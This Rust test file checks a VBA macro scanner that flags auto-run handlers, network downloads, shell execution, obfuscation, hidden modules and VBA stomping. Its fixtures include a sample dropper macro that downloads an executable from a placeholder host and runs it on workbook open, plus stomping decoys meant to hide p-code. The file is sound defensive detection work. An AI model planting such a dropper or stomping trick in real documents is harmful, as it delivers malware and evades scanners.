//! Risk flags on projects built in code. Reading never runs anything.

mod common;

use carrysheet_vba::cfb::{Builder, CompoundFile};
use carrysheet_vba::{ModuleKind, RiskKind, VbaError, read_vba_project_bin, read_xls_vba};
use common::{ModuleSpec, Streams};

fn flags(p: &carrysheet_vba::VbaProject) -> Vec<(RiskKind, &str, &str, Option<u32>)> {
    p.flags
        .iter()
        .map(|f| (f.kind, f.rule, f.module.as_str(), f.line))
        .collect()
}

const DROPPER: &str = "Attribute VB_Name = \"ThisWorkbook\"\r\n\
Private Declare PtrSafe Function URLDownloadToFile Lib \"urlmon\" Alias \"URLDownloadToFileA\" (ByVal a As LongPtr, ByVal b As String, ByVal c As String, ByVal d As Long, ByVal e As LongPtr) As Long\r\n\
Private Sub Workbook_Open()\r\n\
    ' Shell in a comment is not flagged\r\n\
    Dim p As String\r\n\
    p = Environ(\"TEMP\") & \"\\x.exe\"\r\n\
    URLDownloadToFile 0, \"http://example.invalid/x\", p, 0, 0\r\n\
    CreateObject(\"WScript.Shell\").Run p\r\n\
    Set h = CreateObject(\"MSXML2.XMLHTTP\")\r\n\
    Kill p\r\n\
End Sub\r\n";

#[test]
fn a_dropper_raises_each_flag_on_its_line() {
    let modules = [
        ModuleSpec::document("ThisWorkbook", DROPPER),
        ModuleSpec::standard(
            "Module1",
            "Attribute VB_Name = \"Module1\"\r\nSub Hello()\r\nMsgBox \"hi\"\r\nEnd Sub\r\n",
        ),
    ];
    let bin = Streams::new(1252, &modules).to_bin();
    let p = read_vba_project_bin(&bin).unwrap();
    assert_eq!(p.modules[0].kind, ModuleKind::Document);
    assert_eq!(p.modules[1].kind, ModuleKind::Standard);
    use RiskKind::*;
    assert_eq!(
        flags(&p),
        [
            (Network, "URLDownloadToFile", "ThisWorkbook", Some(2)),
            (Win32Api, "Declare", "ThisWorkbook", Some(2)),
            (AutoRun, "Workbook_Open", "ThisWorkbook", Some(3)),
            (Environment, "Environ", "ThisWorkbook", Some(6)),
            (Network, "URLDownloadToFile", "ThisWorkbook", Some(7)),
            (Execute, "WScript.Shell", "ThisWorkbook", Some(8)),
            (Execute, "CreateObject", "ThisWorkbook", Some(9)),
            (Network, "XMLHTTP", "ThisWorkbook", Some(9)),
            (FileSystem, "Kill", "ThisWorkbook", Some(10)),
        ]
    );
    for f in &p.flags {
        assert!(!f.why.is_empty());
    }
}

#[test]
fn obfuscation_and_dynamic_calls() {
    let src = format!(
        "Attribute VB_Name = \"Module1\"\r\nSub Auto_Open()\r\n  s = Chr(99) & Chr(97) & Chr(108) & Chr(99)\r\n  t = StrReverse(\"exe.dmc\")\r\n  CallByName o, s, VbMethod\r\n  u = \"{}\"\r\nEnd Sub\r\n",
        "QUJD".repeat(60)
    );
    let bin = Streams::new(1252, &[ModuleSpec::standard("Module1", &src)]).to_bin();
    let p = read_vba_project_bin(&bin).unwrap();
    let got: Vec<_> = flags(&p)
        .into_iter()
        .map(|(k, r, _, l)| (k, r, l))
        .collect();
    use RiskKind::*;
    assert_eq!(
        got,
        [
            (AutoRun, "Auto_Open", Some(2)),
            (Obfuscation, "Chr chain", Some(3)),
            (Obfuscation, "StrReverse", Some(4)),
            (DynamicCall, "CallByName", Some(5)),
            (Obfuscation, "Long string", Some(6)),
        ]
    );
}

#[test]
fn hidden_module_is_flagged() {
    let mut ghost = ModuleSpec::standard(
        "Ghost",
        "Attribute VB_Name = \"Ghost\"\r\nSub G()\r\nEnd Sub\r\n",
    );
    ghost.project_line = None;
    let modules = [
        ModuleSpec::standard("Module1", "Attribute VB_Name = \"Module1\"\r\n"),
        ghost,
    ];
    let p = read_vba_project_bin(&Streams::new(1252, &modules).to_bin()).unwrap();
    assert!(!p.modules[0].hidden);
    assert!(p.modules[1].hidden);
    assert_eq!(
        flags(&p),
        [(RiskKind::Concealment, "Hidden module", "Ghost", None)]
    );
}

#[test]
fn vba_stomping_signals() {
    // Source removed, p-code kept.
    let mut pcode_only = ModuleSpec::standard("Stomped", "");
    pcode_only.with_source = false;
    pcode_only.pcode = 3000;
    // Benign source next to far more p-code than it explains.
    let mut replaced = ModuleSpec::standard(
        "Replaced",
        "Attribute VB_Name = \"Replaced\"\r\nSub A()\r\nEnd Sub\r\n",
    );
    replaced.pcode = 40_000;
    // A sheet with no code and ordinary p-code: not suspect.
    let sheet = ModuleSpec::document("Sheet1", "Attribute VB_Name = \"Sheet1\"\r\n");
    let p =
        read_vba_project_bin(&Streams::new(1252, &[pcode_only, replaced, sheet]).to_bin()).unwrap();
    let stomped = &p.modules[0];
    assert!(!stomped.has_source && stomped.source.is_none());
    assert_eq!(stomped.pcode_bytes, 3000);
    assert_eq!(
        flags(&p),
        [
            (RiskKind::Concealment, "P-code only", "Stomped", None),
            (RiskKind::Concealment, "Stomping suspect", "Replaced", None),
        ]
    );
}

#[test]
fn flags_work_the_same_inside_xls() {
    let modules = [ModuleSpec::document("ThisWorkbook", DROPPER)];
    let xls = Streams::new(1252, &modules).to_xls();
    let p = read_xls_vba(&xls).unwrap().unwrap();
    assert!(p.flags.iter().any(|f| f.rule == "Workbook_Open"));
}

#[test]
fn code_page_decodes_source_and_names() {
    let modules = [ModuleSpec::standard(
        "Módulo1",
        "Attribute VB_Name = \"Módulo1\"\r\n' Ação\r\n",
    )];
    let p = read_vba_project_bin(&Streams::new(1252, &modules).to_bin()).unwrap();
    assert_eq!(p.modules[0].name, "Módulo1");
    assert!(p.modules[0].source.as_deref().unwrap().contains("Ação"));
    assert!(!p.modules[0].hidden);
}

/// Where Module1's source starts in SimpleMacro-vbaProject.bin: the
/// signature byte of its compressed container (p-code is 1186 bytes).
const MODULE1_SOURCE_AT: usize = 0xCA2;

#[test]
fn repro_zeroed_container_signature_is_flagged() {
    // One byte changed: the source can no longer be read, but the 1186
    // bytes of p-code that Excel runs are still there.
    let mut bin = common::data("SimpleMacro-vbaProject.bin");
    assert_eq!(bin[MODULE1_SOURCE_AT], 0x01);
    bin[MODULE1_SOURCE_AT] = 0x00;
    let p = read_vba_project_bin(&bin).unwrap();
    let m = &p.modules[0];
    assert_eq!(m.name, "Module1");
    assert_eq!(m.pcode_bytes, 1186);
    assert!(matches!(m.error, Some(VbaError::BadCompression { .. })));
    assert!(!m.error.as_ref().unwrap().fix().contains("save it again"));
    assert_eq!(
        flags(&p),
        [(RiskKind::Concealment, "Unreadable source", "Module1", None)]
    );
    assert_eq!(p.flags[0].module_index, 0);
}

/// SimpleMacro-vbaProject.bin with Module1's source replaced by `decoy`
/// and its 1186 bytes of p-code kept: VBA stomping.
fn stomp_simple_macro(decoy: &str) -> Vec<u8> {
    let bin = common::data("SimpleMacro-vbaProject.bin");
    let cf = CompoundFile::open(&bin).unwrap();
    let mut stream = cf.read_stream("/VBA/Module1").unwrap();
    assert_eq!(stream[1186], 0x01);
    stream.truncate(1186);
    stream.extend(common::compress_literal(decoy.as_bytes()));
    let mut b = Builder::from_file(&cf).unwrap();
    b.put_stream("/VBA/Module1", stream).unwrap();
    b.to_bytes().unwrap()
}

fn module_rules(p: &carrysheet_vba::VbaProject, index: usize) -> Vec<&'static str> {
    p.flags
        .iter()
        .filter(|f| f.module_index == index)
        .map(|f| f.rule)
        .collect()
}

#[test]
fn repro_attribute_only_decoy_over_real_pcode_is_flagged() {
    // The source is replaced by a lone Attribute line padded with spaces,
    // while the p-code of the real macro stays.
    let decoy = format!("Attribute VB_Name = \"Module1\"\r\n{}\r\n", " ".repeat(199));
    let p = read_vba_project_bin(&stomp_simple_macro(&decoy)).unwrap();
    let m = &p.modules[0];
    assert!(m.source.is_some() && !m.has_source);
    assert_eq!(
        flags(&p),
        [(RiskKind::Concealment, "Stomping suspect", "Module1", None)]
    );
}

#[test]
fn probe_padded_decoys_do_not_hide_pcode() {
    let head = "Attribute VB_Name = \"Module1\"\r\n";
    for (label, body) in [
        ("comments only", "' a\r\n' b\r\n' c\r\n' d\r\n"),
        ("one `Sub a` line", "Sub a\r\n"),
        ("three `x` lines", "x\r\nx\r\nx\r\n"),
        (
            "two Sub/End Sub",
            "Sub A(): End Sub\r\nSub B(): End Sub\r\n",
        ),
    ] {
        let p = read_vba_project_bin(&stomp_simple_macro(&format!("{head}{body}"))).unwrap();
        assert!(p.modules[0].has_source, "{label}");
        assert_eq!(module_rules(&p, 0), ["Stomping suspect"], "{label}");
    }
    // 10 KB of p-code behind N lines of `Sub a`.
    for n in [10usize, 15, 16, 20] {
        let mut m = ModuleSpec::standard(
            "M",
            &format!("Attribute VB_Name = \"M\"\r\n{}", "Sub a\r\n".repeat(n)),
        );
        m.pcode = 10_000;
        let p = read_vba_project_bin(&Streams::new(1252, &[m]).to_bin()).unwrap();
        assert_eq!(module_rules(&p, 0), ["Stomping suspect"], "{n} x `Sub a`");
    }
}

#[test]
fn probe_comment_decoys_do_not_hide_pcode() {
    // The cheapest comment decoys: p-code keeps comment text at about its
    // own length, so comments explain 2 bytes per character.
    for (pcode, n) in [
        (10_000usize, 47usize),
        (10_000, 46),
        (5_000, 22),
        (34_030, 168),
    ] {
        let body: String = (0..n).map(|i| format!("'{i:012}\r\n")).collect();
        let mut m = ModuleSpec::standard("M", &format!("Attribute VB_Name = \"M\"\r\n{body}"));
        m.pcode = pcode;
        let p = read_vba_project_bin(&Streams::new(1252, &[m]).to_bin()).unwrap();
        assert_eq!(
            module_rules(&p, 0),
            ["Stomping suspect"],
            "{n} x 13-char comment over {pcode} B"
        );
    }
    let head = "Attribute VB_Name = \"Module1\"\r\n";
    for n in [2usize, 3, 4] {
        let body = "'aaaaaaaaaaaa\r\n".repeat(n);
        let p = read_vba_project_bin(&stomp_simple_macro(&format!("{head}{body}"))).unwrap();
        assert_eq!(
            module_rules(&p, 0),
            ["Stomping suspect"],
            "SimpleMacro, {n} x 13-char comment"
        );
    }
}

#[test]
fn probe_suffix_names_in_a_standard_module_do_not_fill_the_list() {
    // `_GotFocus` names are ordinary procedures in a standard module: they
    // must not use up the flag list before the real payload.
    for n in [9_999usize, 10_000, 20_000] {
        let src = format!(
            "Attribute VB_Name = \"M\"\r\n{}Sub AutoOpen()\r\nShell \"calc\"\r\nEnd Sub\r\n",
            "Sub a_GotFocus\r\n".repeat(n)
        );
        let p =
            read_vba_project_bin(&Streams::new(1252, &[ModuleSpec::standard("M", &src)]).to_bin())
                .unwrap();
        let line = n as u32 + 2;
        let got: Vec<_> = p.flags.iter().map(|f| (f.rule, f.line)).collect();
        assert_eq!(
            got,
            [("AutoOpen", Some(line)), ("Shell", Some(line + 1))],
            "{n} x `Sub a_GotFocus`"
        );
    }
    // In a document module the same names are events: the list fills, and
    // its last flag says it was cut.
    let src = format!(
        "Attribute VB_Name = \"Sheet1\"\r\n{}Sub AutoOpen()\r\nShell \"calc\"\r\nEnd Sub\r\n",
        "Sub a_GotFocus\r\n".repeat(20_000)
    );
    let m = ModuleSpec::document("Sheet1", &src);
    let p = read_vba_project_bin(&Streams::new(1252, &[m]).to_bin()).unwrap();
    assert_eq!(p.modules[0].kind, ModuleKind::Document);
    let max = carrysheet_vba::Limits::default().max_flags;
    assert_eq!(p.flags.len(), max + 1);
    let last = p.flags.last().unwrap();
    assert_eq!(
        (last.rule, last.kind, last.line),
        ("Flag list cut short", RiskKind::Obfuscation, None)
    );
    assert_eq!(
        p.flags
            .iter()
            .filter(|f| f.rule == "Flag list cut short")
            .count(),
        1
    );
}

#[test]
fn probe_attribute_continuation_and_overlong_lines() {
    let read = |src: &str| {
        let p =
            read_vba_project_bin(&Streams::new(1252, &[ModuleSpec::standard("M", src)]).to_bin())
                .unwrap();
        p.flags.iter().map(|f| (f.rule, f.line)).collect::<Vec<_>>()
    };
    let shell = [("AutoOpen", Some(2)), ("Shell", Some(2))];
    assert_eq!(
        read("Attribute VB_Name = \"M\"\r\nSub AutoOpen(): Shell \"calc\": End Sub\r\n"),
        shell
    );
    // ` _` after an Attribute line must not swallow the next line.
    assert_eq!(
        read("Attribute VB_Name = \"M\" _\r\nSub AutoOpen(): Shell \"calc\": End Sub\r\n"),
        shell
    );
    assert_eq!(
        read(
            "Attribute VB_Name = \"M\"\r\nAttribute VB_Exposed = False _\r\nPrivate Sub Workbook_Open()\r\nEnd Sub\r\n"
        ),
        [("Workbook_Open", Some(3))]
    );
    // A long string first, Shell past the 32 KB cut: Overlong still shows.
    let src = format!(
        "Sub A()\r\nx = \"{}\" & {} & Shell(\"calc\")\r\nEnd Sub\r\n",
        "a".repeat(300),
        "1 + ".repeat(10_000)
    );
    assert_eq!(
        read(&src),
        [("Long string", Some(2)), ("Overlong line", Some(2))]
    );
    // A header continued over 65 lines hits the cap; over 25 it does not.
    let src = format!(
        "Private Sub _\r\n{}Workbook_Open()\r\nEnd Sub\r\n",
        " _\r\n".repeat(63)
    );
    assert_eq!(read(&src), [("Overlong line", Some(1))]);
    let src = format!(
        "Private Sub _\r\n{}Workbook_Open()\r\nEnd Sub\r\n",
        " _\r\n".repeat(23)
    );
    assert_eq!(read(&src), [("Workbook_Open", Some(1))]);
}

#[test]
fn continued_lines_report_their_first_line() {
    let src = "Attribute VB_Name = \"ThisWorkbook\"\r\nPrivate Sub _\r\nWorkbook_Open()\r\nOpen p _\r\nFor Output As #1\r\nEnd Sub\r\n";
    let p = read_vba_project_bin(
        &Streams::new(1252, &[ModuleSpec::document("ThisWorkbook", src)]).to_bin(),
    )
    .unwrap();
    use RiskKind::*;
    assert_eq!(
        flags(&p),
        [
            (AutoRun, "Workbook_Open", "ThisWorkbook", Some(2)),
            (FileSystem, "Open For Output", "ThisWorkbook", Some(4)),
        ]
    );
}

#[test]
fn flag_names_are_safe_to_show() {
    let name = format!("Evil\u{1b}[2J{}", "x".repeat(300));
    let mut m = ModuleSpec::standard(&name, "Sub A()\r\nShell \"calc\"\r\nEnd Sub\r\n");
    m.stream = "Evil".into();
    let p = read_vba_project_bin(&Streams::new(1252, &[m]).to_bin()).unwrap();
    assert_eq!(p.modules[0].name, name);
    let f = &p.flags[0];
    assert_eq!(f.rule, "Shell");
    assert!(f.module.starts_with("Evil\\u{1b}[2J"));
    assert!(f.module.chars().count() <= 212);
    assert_eq!(f.module_index, 0);
}

#[test]
fn overlong_lines_are_cut_and_flagged() {
    // 100 KB on one line: scanned only up to the cut, and flagged.
    let src = format!("Sub A()\r\nx = 1{}\r\nEnd Sub\r\n", " + 1".repeat(25_000));
    let p = read_vba_project_bin(&Streams::new(1252, &[ModuleSpec::standard("M", &src)]).to_bin())
        .unwrap();
    assert_eq!(
        flags(&p),
        [(RiskKind::Obfuscation, "Overlong line", "M", Some(2))]
    );
}
